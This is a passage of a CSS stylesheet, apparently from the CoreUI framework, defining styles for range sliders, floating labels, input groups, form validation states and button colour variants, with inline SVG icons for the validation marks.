            .form-range::-moz-range-thumb:active {
                background-color: var(--cui-form-range-thumb-active-bg, #c2bcf4);
            }
            .form-range::-moz-range-track {
                width: 100%;
                height: 0.5rem;
                color: transparent;
                cursor: pointer;
                background-color: var(--cui-form-range-track-bg, #c4c9d0);
                border-color: transparent;
                border-radius: 1rem;
            }
            .form-range:disabled {
                pointer-events: none;
            }
            .form-range:disabled::-webkit-slider-thumb {
                background-color: var(--cui-form-range-thumb-disabled-bg, #9da5b1);
            }
            .form-range:disabled::-moz-range-thumb {
                background-color: var(--cui-form-range-thumb-disabled-bg, #9da5b1);
            }
            .form-floating {
                position: relative;
            }
            .form-floating > .form-control,
            .form-floating > .form-control-plaintext,
            .form-floating > .form-select {
                height: calc(3.5rem + 2px);
                line-height: 1.25;
            }
            .form-floating > label {
                position: absolute;
                top: 0;
                width: 100%;
                height: 100%;
                padding: 1rem 0.75rem;
                overflow: hidden;
                text-align: start;
                text-overflow: ellipsis;
                white-space: nowrap;
                pointer-events: none;
                border: 1px solid transparent;
                transform-origin: 0 0;
                transition: opacity 0.1s ease-in-out, transform 0.1s ease-in-out;
            }
            html:not([dir="rtl"]) .form-floating > label {
                left: 0;
            }
            *[dir="rtl"] .form-floating > label {
                right: 0;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-floating > label {
                    transition: none;
                }
            }
            .form-floating > .form-control,
            .form-floating > .form-control-plaintext {
                padding: 1rem 0.75rem;
            }
            .form-floating > .form-control::-moz-placeholder,
            .form-floating > .form-control-plaintext::-moz-placeholder {
                color: transparent;
            }
            .form-floating > .form-control::placeholder,
            .form-floating > .form-control-plaintext::placeholder {
                color: transparent;
            }
            .form-floating > .form-control:not(:-moz-placeholder-shown),
            .form-floating > .form-control-plaintext:not(:-moz-placeholder-shown) {
                padding-top: 1.625rem;
                padding-bottom: 0.625rem;
            }
            .form-floating > .form-control:focus,
            .form-floating > .form-control:not(:placeholder-shown),
            .form-floating > .form-control-plaintext:focus,
            .form-floating > .form-control-plaintext:not(:placeholder-shown) {
                padding-top: 1.625rem;
                padding-bottom: 0.625rem;
            }
            .form-floating > .form-control:-webkit-autofill,
            .form-floating > .form-control-plaintext:-webkit-autofill {
                padding-top: 1.625rem;
                padding-bottom: 0.625rem;
            }
            .form-floating > .form-select {
                padding-top: 1.625rem;
                padding-bottom: 0.625rem;
            }
            .form-floating > .form-control:not(:-moz-placeholder-shown) ~ label {
                opacity: 0.65;
                transform: scale(0.85) translateY(-0.5rem) translateX(0.15rem);
            }
            .form-floating > .form-control:focus ~ label,
            .form-floating > .form-control:not(:placeholder-shown) ~ label,
            .form-floating > .form-control-plaintext ~ label,
            .form-floating > .form-select ~ label {
                opacity: 0.65;
                transform: scale(0.85) translateY(-0.5rem) translateX(0.15rem);
            }
            .form-floating > .form-control:-webkit-autofill ~ label {
                opacity: 0.65;
                transform: scale(0.85) translateY(-0.5rem) translateX(0.15rem);
            }
            .form-floating > .form-control-plaintext ~ label {
                border-width: 1px 0;
            }
            .input-group {
                position: relative;
                display: flex;
                flex-wrap: wrap;
                align-items: stretch;
                width: 100%;
            }
            .input-group > .form-control,
            .input-group > .form-select,
            .input-group > .form-floating {
                position: relative;
                flex: 1 1 auto;
                width: 1%;
                min-width: 0;
            }
            .input-group > .form-control:focus,
            .input-group > .form-select:focus,
            .input-group > .form-floating:focus-within {
                z-index: 5;
            }
            .input-group .btn {
                position: relative;
                z-index: 2;
            }
            .input-group .btn:focus {
                z-index: 5;
            }
            .input-group-text {
                display: flex;
                align-items: center;
                padding: 0.375rem 0.75rem;
                font-size: 1rem;
                font-weight: 400;
                line-height: 1.5;
                color: var(--cui-input-group-addon-color, rgba(44, 56, 74, 0.95));
                text-align: center;
                white-space: nowrap;
                background-color: var(--cui-input-group-addon-bg, #d8dbe0);
                border: 1px solid var(--cui-input-group-addon-border-color, #b1b7c1);
                border-radius: 0.375rem;
            }
            .input-group-lg > .form-control,
            .input-group-lg > .form-select,
            .input-group-lg > .input-group-text,
            .input-group-lg > .btn {
                padding: 0.5rem 1rem;
                font-size: 1.25rem;
                border-radius: 0.5rem;
            }
            .input-group-sm > .form-control,
            .input-group-sm > .form-select,
            .input-group-sm > .input-group-text,
            .input-group-sm > .btn {
                padding: 0.25rem 0.5rem;
                font-size: 0.875rem;
                border-radius: 0.25rem;
            }
            html:not([dir="rtl"]) .input-group-lg > .form-select,
            html:not([dir="rtl"]) .input-group-sm > .form-select {
                padding-right: 3rem;
            }
            *[dir="rtl"] .input-group-lg > .form-select,
            *[dir="rtl"] .input-group-sm > .form-select {
                padding-left: 3rem;
            }
            html:not([dir="rtl"]) .input-group:not(.has-validation) > :not(:last-child):not(.dropdown-toggle):not(.dropdown-menu):not(.form-floating),
            html:not([dir="rtl"]) .input-group:not(.has-validation) > .dropdown-toggle:nth-last-child(n + 3),
            html:not([dir="rtl"]) .input-group:not(.has-validation) > .form-floating:not(:last-child) > .form-control,
            html:not([dir="rtl"]) .input-group:not(.has-validation) > .form-floating:not(:last-child) > .form-select {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            *[dir="rtl"] .input-group:not(.has-validation) > :not(:last-child):not(.dropdown-toggle):not(.dropdown-menu):not(.form-floating),
            *[dir="rtl"] .input-group:not(.has-validation) > .dropdown-toggle:nth-last-child(n + 3),
            *[dir="rtl"] .input-group:not(.has-validation) > .form-floating:not(:last-child) > .form-control,
            *[dir="rtl"] .input-group:not(.has-validation) > .form-floating:not(:last-child) > .form-select {
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            html:not([dir="rtl"]) .input-group.has-validation > :nth-last-child(n + 3):not(.dropdown-toggle):not(.dropdown-menu):not(.form-floating),
            html:not([dir="rtl"]) .input-group.has-validation > .dropdown-toggle:nth-last-child(n + 4),
            html:not([dir="rtl"]) .input-group.has-validation > .form-floating:nth-last-child(n + 3) > .form-control,
            html:not([dir="rtl"]) .input-group.has-validation > .form-floating:nth-last-child(n + 3) > .form-select {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            *[dir="rtl"] .input-group.has-validation > :nth-last-child(n + 3):not(.dropdown-toggle):not(.dropdown-menu):not(.form-floating),
            *[dir="rtl"] .input-group.has-validation > .dropdown-toggle:nth-last-child(n + 4),
            *[dir="rtl"] .input-group.has-validation > .form-floating:nth-last-child(n + 3) > .form-control,
            *[dir="rtl"] .input-group.has-validation > .form-floating:nth-last-child(n + 3) > .form-select {
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            html:not([dir="rtl"]) .input-group > :not(:first-child):not(.dropdown-menu):not(.valid-tooltip):not(.valid-feedback):not(.invalid-tooltip):not(.invalid-feedback) {
                margin-left: -1px;
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            *[dir="rtl"] .input-group > :not(:first-child):not(.dropdown-menu):not(.valid-tooltip):not(.valid-feedback):not(.invalid-tooltip):not(.invalid-feedback) {
                margin-right: -1px;
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            html:not([dir="rtl"]) .input-group > .form-floating:not(:first-child) > .form-control,
            html:not([dir="rtl"]) .input-group > .form-floating:not(:first-child) > .form-select {
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            *[dir="rtl"] .input-group > .form-floating:not(:first-child) > .form-control,
            *[dir="rtl"] .input-group > .form-floating:not(:first-child) > .form-select {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            .valid-feedback {
                display: none;
                width: 100%;
                margin-top: 0.25rem;
                font-size: 0.875em;
                color: #2eb85c;
            }
            .valid-tooltip {
                position: absolute;
                top: 100%;
                z-index: 5;
                display: none;
                max-width: 100%;
                padding: 0.25rem 0.5rem;
                margin-top: 0.1rem;
                font-size: 0.875rem;
                color: #000015;
                background-color: rgba(46, 184, 92, 0.9);
                border-radius: 0.375rem;
            }
            .was-validated :valid ~ .valid-feedback,
            .was-validated :valid ~ .valid-tooltip,
            .is-valid ~ .valid-feedback,
            .is-valid ~ .valid-tooltip {
                display: block;
            }
            .was-validated .form-control:valid,
            .form-control.is-valid {
                border-color: #2eb85c;
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA4IDgnPjxwYXRoIGZpbGw9JyMyZWI4NWMnIGQ9J00yLjMgNi43My42IDQuNTNjLS40LTEuMDQuNDYtMS40IDEuMS0uOGwxLjEgMS40IDMuNC0zLjhjLjYtLjYzIDEuNi0uMjcgMS4yLjdsLTQgNC42Yy0uNDMuNS0uOC40LTEuMS4xeicvPjwvc3ZnPg==);
                background-repeat: no-repeat;
                background-size: calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);
            }
            html:not([dir="rtl"]) .was-validated .form-control:valid,
            html:not([dir="rtl"]) .form-control.is-valid {
                padding-right: calc(1.5em + 0.75rem);
                background-position: right calc(0.375em + 0.1875rem) center;
            }
            *[dir="rtl"] .was-validated .form-control:valid,
            *[dir="rtl"] .form-control.is-valid {
                padding-left: calc(1.5em + 0.75rem);
                background-position: left calc(0.375em + 0.1875rem) center;
            }
            .was-validated .form-control:valid:focus,
            .form-control.is-valid:focus {
                border-color: #2eb85c;
                box-shadow: 0 0 0 0.25rem rgba(46, 184, 92, 0.25);
            }
            html:not([dir="rtl"]) .was-validated textarea.form-control:valid,
            html:not([dir="rtl"]) textarea.form-control.is-valid {
                padding-right: calc(1.5em + 0.75rem);
                background-position: top calc(0.375em + 0.1875rem) right calc(0.375em + 0.1875rem);
            }
            *[dir="rtl"] .was-validated textarea.form-control:valid,
            *[dir="rtl"] textarea.form-control.is-valid {
                padding-left: calc(1.5em + 0.75rem);
                background-position: top calc(0.375em + 0.1875rem) left calc(0.375em + 0.1875rem);
            }
            .was-validated .form-select:valid,
            .form-select.is-valid {
                border-color: #2eb85c;
            }
            .was-validated .form-select:valid:not([multiple]):not([size]),
            .was-validated .form-select:valid:not([multiple])[size="1"],
            .form-select.is-valid:not([multiple]):not([size]),
            .form-select.is-valid:not([multiple])[size="1"] {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxNiAxNic+PHBhdGggZmlsbD0nbm9uZScgc3Ryb2tlPScjNjM2ZjgzJyBzdHJva2UtbGluZWNhcD0ncm91bmQnIHN0cm9rZS1saW5lam9pbj0ncm91bmQnIHN0cm9rZS13aWR0aD0nMicgZD0nbTIgNSA2IDYgNi02Jy8+PC9zdmc+),
                    url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA4IDgnPjxwYXRoIGZpbGw9JyMyZWI4NWMnIGQ9J00yLjMgNi43My42IDQuNTNjLS40LTEuMDQuNDYtMS40IDEuMS0uOGwxLjEgMS40IDMuNC0zLjhjLjYtLjYzIDEuNi0uMjcgMS4yLjdsLTQgNC42Yy0uNDMuNS0uOC40LTEuMS4xeicvPjwvc3ZnPg==);
                background-size: 16px 12px, calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);
            }
            html:not([dir="rtl"]) .was-validated .form-select:valid:not([multiple]):not([size]),
            html:not([dir="rtl"]) .was-validated .form-select:valid:not([multiple])[size="1"],
            html:not([dir="rtl"]) .form-select.is-valid:not([multiple]):not([size]),
            html:not([dir="rtl"]) .form-select.is-valid:not([multiple])[size="1"] {
                padding-right: 4.125rem;
                background-position: right 0.75rem center, center right 2.25rem;
            }
            *[dir="rtl"] .was-validated .form-select:valid:not([multiple]):not([size]),
            *[dir="rtl"] .was-validated .form-select:valid:not([multiple])[size="1"],
            *[dir="rtl"] .form-select.is-valid:not([multiple]):not([size]),
            *[dir="rtl"] .form-select.is-valid:not([multiple])[size="1"] {
                padding-left: 4.125rem;
                background-position: left 0.75rem center, center left 2.25rem;
            }
            .was-validated .form-select:valid:focus,
            .form-select.is-valid:focus {
                border-color: #2eb85c;
                box-shadow: 0 0 0 0.25rem rgba(46, 184, 92, 0.25);
            }
            .was-validated .form-control-color:valid,
            .form-control-color.is-valid {
                width: calc(3rem + calc(1.5em + 0.75rem));
            }
            .was-validated .form-check-input:valid,
            .form-check-input.is-valid {
                border-color: #2eb85c;
            }
            .was-validated .form-check-input:valid:checked,
            .form-check-input.is-valid:checked {
                background-color: #2eb85c;
            }
            .was-validated .form-check-input:valid:focus,
            .form-check-input.is-valid:focus {
                box-shadow: 0 0 0 0.25rem rgba(46, 184, 92, 0.25);
            }
            .was-validated .form-check-input:valid ~ .form-check-label,
            .form-check-input.is-valid ~ .form-check-label {
                color: #2eb85c;
            }
            html:not([dir="rtl"]) .form-check-inline .form-check-input ~ .valid-feedback {
                margin-left: 0.5em;
            }
            *[dir="rtl"] .form-check-inline .form-check-input ~ .valid-feedback {
                margin-right: 0.5em;
            }
            .was-validated .input-group > .form-control:not(:focus):valid,
            .input-group > .form-control:not(:focus).is-valid,
            .was-validated .input-group > .form-select:not(:focus):valid,
            .input-group > .form-select:not(:focus).is-valid,
            .was-validated .input-group > .form-floating:not(:focus-within):valid,
            .input-group > .form-floating:not(:focus-within).is-valid {
                z-index: 3;
            }
            .invalid-feedback {
                display: none;
                width: 100%;
                margin-top: 0.25rem;
                font-size: 0.875em;
                color: #e55353;
            }
            .invalid-tooltip {
                position: absolute;
                top: 100%;
                z-index: 5;
                display: none;
                max-width: 100%;
                padding: 0.25rem 0.5rem;
                margin-top: 0.1rem;
                font-size: 0.875rem;
                color: #000015;
                background-color: rgba(229, 83, 83, 0.9);
                border-radius: 0.375rem;
            }
            .was-validated :invalid ~ .invalid-feedback,
            .was-validated :invalid ~ .invalid-tooltip,
            .is-invalid ~ .invalid-feedback,
            .is-invalid ~ .invalid-tooltip {
                display: block;
            }
            .was-validated .form-control:invalid,
            .form-control.is-invalid {
                border-color: #e55353;
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxMiAxMicgd2lkdGg9JzEyJyBoZWlnaHQ9JzEyJyBmaWxsPSdub25lJyBzdHJva2U9JyNlNTUzNTMnPjxjaXJjbGUgY3g9JzYnIGN5PSc2JyByPSc0LjUnLz48cGF0aCBzdHJva2UtbGluZWpvaW49J3JvdW5kJyBkPSdNNS44IDMuNmguNEw2IDYuNXonLz48Y2lyY2xlIGN4PSc2JyBjeT0nOC4yJyByPScuNicgZmlsbD0nI2U1NTM1Mycgc3Ryb2tlPSdub25lJy8+PC9zdmc+);
                background-repeat: no-repeat;
                background-size: calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);
            }
            html:not([dir="rtl"]) .was-validated .form-control:invalid,
            html:not([dir="rtl"]) .form-control.is-invalid {
                padding-right: calc(1.5em + 0.75rem);
                background-position: right calc(0.375em + 0.1875rem) center;
            }
            *[dir="rtl"] .was-validated .form-control:invalid,
            *[dir="rtl"] .form-control.is-invalid {
                padding-left: calc(1.5em + 0.75rem);
                background-position: left calc(0.375em + 0.1875rem) center;
            }
            .was-validated .form-control:invalid:focus,
            .form-control.is-invalid:focus {
                border-color: #e55353;
                box-shadow: 0 0 0 0.25rem rgba(229, 83, 83, 0.25);
            }
            html:not([dir="rtl"]) .was-validated textarea.form-control:invalid,
            html:not([dir="rtl"]) textarea.form-control.is-invalid {
                padding-right: calc(1.5em + 0.75rem);
                background-position: top calc(0.375em + 0.1875rem) right calc(0.375em + 0.1875rem);
            }
            *[dir="rtl"] .was-validated textarea.form-control:invalid,
            *[dir="rtl"] textarea.form-control.is-invalid {
                padding-left: calc(1.5em + 0.75rem);
                background-position: top calc(0.375em + 0.1875rem) left calc(0.375em + 0.1875rem);
            }
            .was-validated .form-select:invalid,
            .form-select.is-invalid {
                border-color: #e55353;
            }
            .was-validated .form-select:invalid:not([multiple]):not([size]),
            .was-validated .form-select:invalid:not([multiple])[size="1"],
            .form-select.is-invalid:not([multiple]):not([size]),
            .form-select.is-invalid:not([multiple])[size="1"] {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxNiAxNic+PHBhdGggZmlsbD0nbm9uZScgc3Ryb2tlPScjNjM2ZjgzJyBzdHJva2UtbGluZWNhcD0ncm91bmQnIHN0cm9rZS1saW5lam9pbj0ncm91bmQnIHN0cm9rZS13aWR0aD0nMicgZD0nbTIgNSA2IDYgNi02Jy8+PC9zdmc+),
                    url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxMiAxMicgd2lkdGg9JzEyJyBoZWlnaHQ9JzEyJyBmaWxsPSdub25lJyBzdHJva2U9JyNlNTUzNTMnPjxjaXJjbGUgY3g9JzYnIGN5PSc2JyByPSc0LjUnLz48cGF0aCBzdHJva2UtbGluZWpvaW49J3JvdW5kJyBkPSdNNS44IDMuNmguNEw2IDYuNXonLz48Y2lyY2xlIGN4PSc2JyBjeT0nOC4yJyByPScuNicgZmlsbD0nI2U1NTM1Mycgc3Ryb2tlPSdub25lJy8+PC9zdmc+);
                background-size: 16px 12px, calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);
            }
            html:not([dir="rtl"]) .was-validated .form-select:invalid:not([multiple]):not([size]),
            html:not([dir="rtl"]) .was-validated .form-select:invalid:not([multiple])[size="1"],
            html:not([dir="rtl"]) .form-select.is-invalid:not([multiple]):not([size]),
            html:not([dir="rtl"]) .form-select.is-invalid:not([multiple])[size="1"] {
                padding-right: 4.125rem;
                background-position: right 0.75rem center, center right 2.25rem;
            }
            *[dir="rtl"] .was-validated .form-select:invalid:not([multiple]):not([size]),
            *[dir="rtl"] .was-validated .form-select:invalid:not([multiple])[size="1"],
            *[dir="rtl"] .form-select.is-invalid:not([multiple]):not([size]),
            *[dir="rtl"] .form-select.is-invalid:not([multiple])[size="1"] {
                padding-left: 4.125rem;
                background-position: left 0.75rem center, center left 2.25rem;
            }
            .was-validated .form-select:invalid:focus,
            .form-select.is-invalid:focus {
                border-color: #e55353;
                box-shadow: 0 0 0 0.25rem rgba(229, 83, 83, 0.25);
            }
            .was-validated .form-control-color:invalid,
            .form-control-color.is-invalid {
                width: calc(3rem + calc(1.5em + 0.75rem));
            }
            .was-validated .form-check-input:invalid,
            .form-check-input.is-invalid {
                border-color: #e55353;
            }
            .was-validated .form-check-input:invalid:checked,
            .form-check-input.is-invalid:checked {
                background-color: #e55353;
            }
            .was-validated .form-check-input:invalid:focus,
            .form-check-input.is-invalid:focus {
                box-shadow: 0 0 0 0.25rem rgba(229, 83, 83, 0.25);
            }
            .was-validated .form-check-input:invalid ~ .form-check-label,
            .form-check-input.is-invalid ~ .form-check-label {
                color: #e55353;
            }
            html:not([dir="rtl"]) .form-check-inline .form-check-input ~ .invalid-feedback {
                margin-left: 0.5em;
            }
            *[dir="rtl"] .form-check-inline .form-check-input ~ .invalid-feedback {
                margin-right: 0.5em;
            }
            .was-validated .input-group > .form-control:not(:focus):invalid,
            .input-group > .form-control:not(:focus).is-invalid,
            .was-validated .input-group > .form-select:not(:focus):invalid,
            .input-group > .form-select:not(:focus).is-invalid,
            .was-validated .input-group > .form-floating:not(:focus-within):invalid,
            .input-group > .form-floating:not(:focus-within).is-invalid {
                z-index: 4;
            }
            .btn {
                --cui-btn-padding-x: 0.75rem;
                --cui-btn-padding-y: 0.375rem;
                --cui-btn-font-family: ;
                --cui-btn-font-size: 1rem;
                --cui-btn-font-weight: 400;
                --cui-btn-line-height: 1.5;
                --cui-btn-color: rgba(44, 56, 74, 0.95);
                --cui-btn-bg: transparent;
                --cui-btn-border-width: 1px;
                --cui-btn-border-color: transparent;
                --cui-btn-border-radius: 0.375rem;
                --cui-btn-hover-border-color: transparent;
                --cui-btn-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 21, 0.075);
                --cui-btn-disabled-opacity: 0.65;
                --cui-btn-focus-box-shadow: 0 0 0 0.25rem rgba(var(--cui-btn-focus-shadow-rgb), 0.5);
                display: inline-block;
                padding: var(--cui-btn-padding-y) var(--cui-btn-padding-x);
                font-family: var(--cui-btn-font-family);
                font-size: var(--cui-btn-font-size);
                font-weight: var(--cui-btn-font-weight);
                line-height: var(--cui-btn-line-height);
                color: var(--cui-btn-color);
                text-align: center;
                text-decoration: none;
                vertical-align: middle;
                cursor: pointer;
                -webkit-user-select: none;
                -moz-user-select: none;
                user-select: none;
                border: var(--cui-btn-border-width) solid var(--cui-btn-border-color);
                border-radius: var(--cui-btn-border-radius);
                background-color: var(--cui-btn-bg);
                transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .btn {
                    transition: none;
                }
            }
            .btn:not(.placeholder):not([class*="link"]):not([class*="outline"]):not([class*="ghost"]):not([class*="transparent"]):not([class*="close"]) {
                border-color: transparent;
                box-shadow: 0 1px 1px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 2px 1px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 3px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .btn:hover {
                color: var(--cui-btn-hover-color);
                background-color: var(--cui-btn-hover-bg);
                border-color: var(--cui-btn-hover-border-color);
            }
            .btn:hover:not(.placeholder):not([class*="link"]):not([class*="outline"]):not([class*="ghost"]):not([class*="transparent"]):not([class*="close"]) {
                border-color: transparent;
                box-shadow: 0 2px 2px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 1px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .btn-check + .btn:hover {
                color: var(--cui-btn-color);
                background-color: var(--cui-btn-bg);
                border-color: var(--cui-btn-border-color);
            }
            .btn:focus-visible {
                color: var(--cui-btn-hover-color);
                background-color: var(--cui-btn-hover-bg);
                border-color: var(--cui-btn-hover-border-color);
                outline: 0;
                box-shadow: var(--cui-btn-focus-box-shadow);
            }
            .btn-check:focus-visible + .btn {
                border-color: var(--cui-btn-hover-border-color);
                outline: 0;
                box-shadow: var(--cui-btn-focus-box-shadow);
            }
            .btn-check:checked + .btn,
            :not(.btn-check) + .btn:active,
            .btn:first-child:active,
            .btn.active,
            .btn.show {
                color: var(--cui-btn-active-color);
                background-color: var(--cui-btn-active-bg);
                border-color: var(--cui-btn-active-border-color);
            }
            .btn-check:checked + .btn:focus-visible,
            :not(.btn-check) + .btn:active:focus-visible,
            .btn:first-child:active:focus-visible,
            .btn.active:focus-visible,
            .btn.show:focus-visible {
                box-shadow: var(--cui-btn-focus-box-shadow);
            }
            .btn:disabled,
            .btn.disabled,
            fieldset:disabled .btn {
                color: var(--cui-btn-disabled-color);
                pointer-events: none;
                background-color: var(--cui-btn-disabled-bg);
                border-color: var(--cui-btn-disabled-border-color);
                opacity: var(--cui-btn-disabled-opacity);
            }
            .btn-primary {
                --cui-btn-color: rgba(255, 255, 255, 0.87);
                --cui-btn-bg: #321fdb;
                --cui-btn-border-color: #321fdb;
                --cui-btn-hover-color: rgba(255, 255, 255, 0.87);
                --cui-btn-hover-bg: #5141e0;
                --cui-btn-hover-border-color: #4735df;
                --cui-btn-focus-shadow-rgb: 75, 58, 223;
                --cui-btn-active-color: rgba(255, 255, 255, 0.87);
                --cui-btn-active-bg: #5b4ce2;
                --cui-btn-active-border-color: #4735df;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: rgba(255, 255, 255, 0.87);
                --cui-btn-disabled-bg: #321fdb;
                --cui-btn-disabled-border-color: #321fdb;
            }
            .btn-secondary {
                --cui-btn-color: #000015;
                --cui-btn-bg: #9da5b1;
                --cui-btn-border-color: #9da5b1;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-hover-bg: #acb3bd;
                --cui-btn-hover-border-color: #a7aeb9;
                --cui-btn-focus-shadow-rgb: 133, 140, 154;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #b1b7c1;
                --cui-btn-active-border-color: #a7aeb9;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #9da5b1;
                --cui-btn-disabled-border-color: #9da5b1;
            }
            .btn-success {
                --cui-btn-color: #000015;
                --cui-btn-bg: #2eb85c;
                --cui-btn-border-color: #2eb85c;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-hover-bg: #4dc374;
                --cui-btn-hover-border-color: #43bf6c;
                --cui-btn-focus-shadow-rgb: 39, 156, 81;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #58c67d;
                --cui-btn-active-border-color: #43bf6c;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #2eb85c;
                --cui-btn-disabled-border-color: #2eb85c;
            }
            .btn-danger {
                --cui-btn-color: #000015;
                --cui-btn-bg: #e55353;
                --cui-btn-border-color: #e55353;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #e96d6d;
                --cui-btn-hover-border-color: #e86464;
                --cui-btn-focus-shadow-rgb: 195, 71, 74;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #ea7575;
                --cui-btn-active-border-color: #e86464;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #e55353;
                --cui-btn-disabled-border-color: #e55353;
            }
            .btn-warning {
                --cui-btn-color: rgba(44, 56, 74, 0.95);
                --cui-btn-bg: #f9b115;
                --cui-btn-border-color: #f9b115;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #d49612;
                --cui-btn-hover-border-color: #c78e11;
                --cui-btn-focus-shadow-rgb: 221, 160, 28;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #c78e11;
                --cui-btn-active-border-color: #bb8510;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-bg: #f9b115;
                --cui-btn-disabled-border-color: #f9b115;
            }
            .btn-info {
                --cui-btn-color: #000015;
                --cui-btn-bg: #39f;
                --cui-btn-border-color: #39f;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #52a8ff;
                --cui-btn-hover-border-color: #47a3ff;
                --cui-btn-focus-shadow-rgb: 43, 130, 220;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #5cadff;
                --cui-btn-active-border-color: #47a3ff;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #39f;
                --cui-btn-disabled-border-color: #39f;
            }
            .btn-light {
                --cui-btn-color: rgba(44, 56, 74, 0.95);
                --cui-btn-bg: #ebedef;
                --cui-btn-border-color: #ebedef;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-hover-bg: #c8c9cb;
                --cui-btn-hover-border-color: #bcbebf;
                --cui-btn-focus-shadow-rgb: 209, 212, 216;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #bcbebf;
                --cui-btn-active-border-color: #b0b2b3;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-bg: #ebedef;
                --cui-btn-disabled-border-color: #ebedef;
            }
            .btn-dark {
                --cui-btn-color: rgba(255, 255, 255, 0.87);
                --cui-btn-bg: #4f5d73;
                --cui-btn-border-color: #4f5d73;
                --cui-btn-hover-color: #fff;
                --cui-btn-hover-bg: #697588;
                --cui-btn-hover-border-color: #616d81;
                --cui-btn-focus-shadow-rgb: 100, 112, 132;
                --cui-btn-active-color: #fff;
                --cui-btn-active-bg: #727d8f;
                --cui-btn-active-border-color: #616d81;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: rgba(255, 255, 255, 0.87);
                --cui-btn-disabled-bg: #4f5d73;
                --cui-btn-disabled-border-color: #4f5d73;
            }
            .btn-outline-primary {
                --cui-btn-color: #321fdb;
                --cui-btn-border-color: #321fdb;
                --cui-btn-hover-color: rgba(255, 255, 255, 0.87);
                --cui-btn-hover-bg: #5b4ce2;
                --cui-btn-hover-border-color: #4735df;
                --cui-btn-focus-shadow-rgb: 50, 31, 219;
                --cui-btn-active-color: rgba(255, 255, 255, 0.87);
                --cui-btn-active-bg: #5b4ce2;
                --cui-btn-active-border-color: #4735df;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #321fdb;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-secondary {
                --cui-btn-color: #9da5b1;
                --cui-btn-border-color: #9da5b1;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-hover-bg: #b1b7c1;
                --cui-btn-hover-border-color: #a7aeb9;
                --cui-btn-focus-shadow-rgb: 157, 165, 177;
